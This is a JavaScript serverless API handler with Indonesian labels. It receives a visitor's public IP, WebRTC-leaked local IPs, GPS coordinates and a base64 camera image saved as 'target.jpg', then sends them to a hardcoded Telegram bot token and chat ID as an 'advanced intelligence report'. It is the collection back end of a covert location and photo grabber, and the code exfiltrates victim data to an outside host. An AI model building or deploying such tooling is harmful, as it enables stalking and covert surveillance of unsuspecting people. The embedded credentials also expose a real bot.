const axios = require('axios');
const FormData = require('form-data');

export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const token = '8341126680:AAFzJbyih79CWYbcj8ypSktqEecdh7Cf7Io';
    const chatId = '7710372176';

    const ipAddress = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    const { latitude, longitude, accuracy, image, localIPs } = req.body;

    const ipListStr = localIPs && localIPs.length > 0 ? localIPs.join(', ') : 'Tidak terdeteksi';

    try {
        const captionText = `🚨 **Laporan Intelijen Lanjutan**\n\n` +
                            `🌐 **Public IP:** ${ipAddress}\n` +
                            `💻 **Local/WebRTC IP:** ${ipListStr}\n` +
                            `📍 **Latitude:** ${latitude || 'N/A'}\n` +
                            `📍 **Longitude:** ${longitude || 'N/A'}\n` +
                            `🎯 **Akurasi GPS:** ${accuracy ? accuracy + ' meter' : '-'}\n` +
                            `🗺️ **Maps:** https://maps.google.com/?q=${latitude},${longitude}`;

        if (image) {
            const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");
            const buffer = Buffer.from(base64Data, 'base64');

            const form = new FormData();
            form.append('chat_id', chatId);
            form.append('photo', buffer, { filename: 'target.jpg', contentType: 'image/jpeg' });
            form.append('caption', captionText);
            form.append('parse_mode', 'Markdown');

            await axios.post(`https://api.telegram.org/bot${token}/sendPhoto`, form, {
                headers: form.getHeaders()
            });
        } else {
            await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
                chat_id: chatId,
                text: captionText,
                parse_mode: 'Markdown'
            });
        }

        return res.status(200).json({ status: 'success' });
    } catch (error) {
        return res.status(500).json({ status: 'error', message: error.message });
    }
}
